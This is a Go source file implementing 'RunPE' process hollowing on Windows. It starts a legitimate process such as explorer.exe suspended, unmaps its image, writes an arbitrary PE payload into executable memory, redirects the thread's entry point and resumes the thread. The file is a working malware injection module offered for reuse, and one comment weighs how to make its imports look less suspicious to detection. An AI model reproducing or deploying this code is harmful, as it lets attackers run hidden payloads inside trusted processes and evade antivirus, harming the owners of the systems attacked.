package RunPE

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"unsafe"
)

var (
/*
Btw this is rewritten version lol

correct :
virutalallocex := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
----------------------------------------------------------------------------------
bad: 
k32 = windows.NewLazyDLL("kernel32.dll")
virutalallocex = k32.NewProc("VirtualAllocEx")
----------------------------------------------------------------------------------
you basically make big mistake, why? cuz you import the ENTIRE DLL, you dont use the specified function in it, you import it entirely with all other 329 calls inside there
but it is and isnt, cuz specific imports are EXTREMLY, suspicious so uhh yk :shrug: so in nutshell it doesnt really matter lol
*/
	VirtualAllocEx = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
	GetThreadContext = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetThreadContext")
	SetThreadContext = windows.NewLazySystemDLL("kernel32.dll").NewProc("SetThreadContext")
	NtUnmapViewOfSection = windows.NewLazySystemDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")
)

/*
Inject starts the src process and injects the target process (I used explorer.exe)

https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
https://bytepointer.com/resources/tebpeb64.htm

Also were Writing all sections.

*/

func Inject(srcPath string, destPE []byte, console bool) {
    defer func() {
        if r := recover(); r != nil {
            fmt.Println("Recovered in Inject:", r)
        }
    }()

    defer func() {
        fmt.Printf("[*] Creating process: %v\n", srcPath)
    }()

    cmd, err := windows.UTF16PtrFromString(srcPath)
    defer CheckErr(err)

    si := new(windows.StartupInfo)
    pi := new(windows.ProcessInformation)
    var flag uint32

    if console {
        flag = windows.CREATE_NEW_CONSOLE | windows.CREATE_SUSPENDED
    } else {
        flag = windows.CREATE_SUSPENDED
    }

    err = windows.CreateProcess(cmd, nil, nil, nil, false, flag, nil, nil, si, pi)
    defer CheckErr(err)
    defer fmt.Printf("[+] Process created. Process: %v, Thread: %v\n", pi.Process, pi.Thread)

    hProcess := pi.Process
    hThread := pi.Thread

    defer func() {
        fmt.Printf("[*] Getting thread context of %v\n", hThread)
    }()
    ctx, err := getThreadContext(uintptr(hThread))
    defer CheckErr(err)
    Rdx := binary.LittleEndian.Uint64(ctx[136:])

    defer func() {
        fmt.Printf("[+] Address to PEB[Rdx]: %x\n", Rdx)
    }()

    baseAddr, err := readProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
    defer CheckErr(err)

    defer func() {
        fmt.Printf("[+] Base Address of Source Image from PEB[ImageBaseAddress]: %x\n", baseAddr)
    }()

    fmt.Printf("[*] Reading destination PE\n")
    destPEReader := bytes.NewReader(destPE)
    defer CheckErr(err)

    f, err := pe.NewFile(destPEReader)
    defer CheckErr(err)
    defer fmt.Printf("[*] Getting OptionalHeader of destination PE\n")

    oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
    if !ok {
        fmt.Printf("OptionalHeader64 not found\n")
    }

    fmt.Printf("[+] ImageBase of destination PE[OptionalHeader.ImageBase]: %x\n", oh.ImageBase)
    fmt.Printf("[*] Unmapping view of section %x\n", baseAddr)
    err = ntUnmapViewOfSection(hProcess, baseAddr)
    defer CheckErr(err)

    fmt.Printf("[*] Allocating memory in process at %x (size: %v)\n", baseAddr, oh.SizeOfImage)

    newImageBase, err := virtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
    defer CheckErr(err)
    defer fmt.Printf("[+] New base address %x\n", newImageBase)

    fmt.Printf("[*] Writing PE to memory in process at %x (size: %v)\n", newImageBase, oh.SizeOfHeaders)
    err = writeProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
    defer CheckErr(err)

    for _, sec := range f.Sections {
        fmt.Printf("[*] Writing section[%v] to memory at %x (size: %v)\n", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
        secData, err := sec.Data()
        defer CheckErr(err)
        err = writeProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
        defer CheckErr(err)
    }

    fmt.Printf("[*] Calculating relocation delta\n")
    delta := int64(oh.ImageBase) - int64(newImageBase)
    fmt.Printf("[+] Relocation delta: %v\n", delta)

    fmt.Printf("[*] Writing new ImageBase to Rdx %x\n", newImageBase)
    addrB := make([]byte, 8)
    binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
    err = writeProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
    defer CheckErr(err)

    binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
    fmt.Printf("[*] Setting new entrypoint to Rcx %x\n", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

    err = setThreadContext(hThread, ctx)
    defer CheckErr(err)

    _, err = resumeThread(hThread)
    defer CheckErr(err)
}


func resumeThread(hThread windows.Handle) (count int32, e error) {
	/*
		DWORD ResumeThread(
			HANDLE hThread
		);
	*/
	ret, err := windows.ResumeThread(hThread)
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in ResumeThread[%v]: %v\n", hThread, e)
		} else {
			fmt.Printf("[*] ResumeThread[%v]\n", hThread)
		}
	}()
	return
}

func virtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
	/*
		LPVOID VirtualAllocEx(
			HANDLE hProcess,
			LPVOID lpAddress,
			SIZE_T dwSize,
			DWORD  flAllocationType,
			DWORD  flProtect
		);
	*/
	ret, _, err := VirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in VirtualAllocEx[%v : %x]: %v\n", hProcess, lpAddress, e)
		} else {
			fmt.Printf("[*] VirtualAllocEx[%v : %x]\n", hProcess, lpAddress)
		}
	}()
	return
}

func readProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
	// Defer a statement to execute after function returns (applies on the func writeProcessMemory aswell)
	defer func() {
		if e != nil {
			fmt.Printf("[*] ReadProcessMemory failed: %v\n", e)
		}
	}()

	defer fmt.Printf("[*] ReadProcessMemory[%v : %x]\n", hProcess, lpBaseAddress)

	var numBytesRead uintptr
	data = make([]byte, size)

	err := windows.ReadProcessMemory(windows.Handle(hProcess),
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}

	return
}

func writeProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
	defer func() {
		if e != nil {
			fmt.Printf("[*] WriteProcessMemory failed: %v\n", e)
		}
	}()

	defer fmt.Printf("[*] WriteProcessMemory[%v : %x]\n", hProcess, lpBaseAddress)

	var numBytesRead uintptr

	err := windows.WriteProcessMemory(hProcess,
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}

	return
}

func getThreadContext(hThread uintptr) (ctx []uint8, e error) {
	/*
		ctx[12] = 0x00100000 | 0x00000002 - (CONTEXT_INTEGER flag to Rdx)
		https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64

		BOOL GetThreadContext(
			HANDLE    hThread,
			LPCONTEXT lpContext
		);
	*/
	ctx = make([]uint8, 1232)
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := GetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in GetThreadContext[%v]: %v\n", hThread, e)
		} else {
			fmt.Printf("[*] GetThreadContext[%v]\n", hThread)
		}
	}()
	return ctx, nil
}

func readProcessMemoryAsAddr(hProcess windows.Handle, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := readProcessMemory(uintptr(hProcess), lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in ReadProcessMemoryAsAddr[%v : %x]: %v\n", hProcess, lpBaseAddress, e)
		} else {
			fmt.Printf("[*] ReadProcessMemoryAsAddr[%v : %x]: [%x]\n", hProcess, lpBaseAddress, val)
		}
	}()
	return
}

func ntUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {
	/*
		Reffernces : 
		https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
		https://msdn.microsoft.com/en-us/windows/desktop/ff557711
		https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html

		NTSTATUS NtUnmapViewOfSection(
			HANDLE    ProcessHandle,
			PVOID     BaseAddress
		);
	*/
	r, _, err := NtUnmapViewOfSection.Call(uintptr(hProcess), baseAddr)
	if r != 0 {
		e = err
	}
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in NtUnmapViewOfSection[%v : %x]: %v\n", hProcess, baseAddr, e)
		} else {
			fmt.Printf("[*] NtUnmapViewOfSection[%v : %x]\n", hProcess, baseAddr)
		}
	}()
	return
}

func setThreadContext(hThread windows.Handle, ctx []uint8) (e error) {
	/*
		BOOL SetThreadContext(
			HANDLE        hThread,
			const CONTEXT *lpContext
		);
	*/
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := SetThreadContext.Call(uintptr(hThread), uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	defer func() {
		if e != nil {
			fmt.Printf("[X] Error in SetThreadContext[%v]: %v\n", hThread, e)
		} else {
			fmt.Printf("[*] SetThreadContext[%v]\n", hThread)
		}
	}()
	return
}

func CheckErr(err error) {
	if err != nil {
		fmt.Println("[X] Error : ", err)
		os.Exit(9999)
	}
}
